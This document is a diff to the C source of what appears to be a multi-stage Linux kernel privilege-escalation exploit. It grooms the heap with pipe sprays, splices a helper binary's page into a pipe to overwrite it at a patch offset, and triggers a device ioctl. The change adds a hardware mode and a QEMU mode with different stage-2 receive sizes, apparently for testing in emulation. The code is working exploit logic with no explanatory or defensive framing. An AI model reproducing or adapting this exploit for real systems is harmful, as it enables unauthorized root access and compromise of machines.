@@ -20,6 +20,8 @@
 #define HELPER_GROOM_PIPE_COUNT 400
 #define SEQ_GROOM_COUNT 512
 #define SEQ_FREE_COUNT 128
+#define HARDWARE_STAGE2_RECEIVE_SIZE 2048
+#define QEMU_STAGE2_RECEIVE_SIZE 1040
 #define PAGE_SIZE 4096
 #define DEVICE_DESCRIPTOR_SIZE 18
 #define SEQ_CONFIG_LENGTH 32
@@ -295,27 +297,32 @@ static int open_device(const char *path)
 }
 
 static void prepare_pipe_target(int pipes[PIPE_COUNT][2], const char *helper,
-				off_t patch_offset)
+				off_t patch_offset, int hardware_mode)
 {
 	char page[PAGE_SIZE] = { 0 };
 	loff_t splice_offset = patch_offset - 1;
-	int source;
+	int source = -1;
 	int i;
 
-	source = open(helper, O_RDONLY);
-	if (source < 0)
-		fail(helper);
+	if (hardware_mode) {
+		source = open(helper, O_RDONLY);
+		if (source < 0)
+			fail(helper);
+	}
 	for (i = 0; i < PIPE_COUNT; i++) {
 		if (pipe(pipes[i]))
 			fail("pipe target spray");
 		if (i == PIPE_COUNT - 1) {
-			if (splice(source, &splice_offset, pipes[i][1], NULL, 1, 0) != 1)
+			if (hardware_mode &&
+			    splice(source, &splice_offset, pipes[i][1], NULL, 1, 0) != 1)
 				fail("splice helper target");
+			if (!hardware_mode && write(pipes[i][1], page, 1) != 1)
+				fail("prepare partial-overwrite target");
 		} else if (write(pipes[i][1], page, sizeof(page)) != sizeof(page)) {
 			fail("fill pipe target spray");
 		}
 	}
-	if (close(source))
+	if (source >= 0 && close(source))
 		fail("close helper source");
 	if (close(pipes[PIPE_COUNT - 2][0]) || close(pipes[PIPE_COUNT - 2][1]))
 		fail("free pipe target slot");
@@ -478,10 +485,11 @@ int main(int argc, char **argv)
 		fprintf(stderr, "invalid Stage 1 context\n");
 		return EXIT_FAILURE;
 	}
-	prepare_pipe_target(pipes, helper, patch_offset);
+	prepare_pipe_target(pipes, helper, patch_offset, hardware_mode);
 	device_fd = open_device(device);
 	result = ioctl(device_fd, KAPO_FETCH_RECORDS, &context);
-	if (result != 2048) {
+	if (result != (hardware_mode ? HARDWARE_STAGE2_RECEIVE_SIZE :
+				      QEMU_STAGE2_RECEIVE_SIZE)) {
 		if (result < 0)
 			perror("KAPO_FETCH_RECORDS");
 		else
